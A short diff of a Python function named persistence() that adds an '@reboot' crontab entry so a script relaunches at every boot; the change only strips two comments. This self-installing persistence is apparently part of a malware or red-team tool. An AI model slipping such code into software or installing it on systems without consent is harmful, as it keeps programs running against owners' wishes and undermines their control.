@@ -123,12 +123,10 @@ def persistence():
 			cron_line = "@reboot python3 {}\n".format(script_path)
 		else:
 			return
-		# The subprocess.run() function is used to run the given command.
 		result = subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
 		current_crontab = result.stdout.decode()
 		
 		if cron_line not in current_crontab:
-			# Adds the task to the crontab, if it's not already there.
 			with open("mycron", "a") as cron_file:
 				cron_file.write(cron_line)
 			subprocess.run(['crontab', 'mycron'])
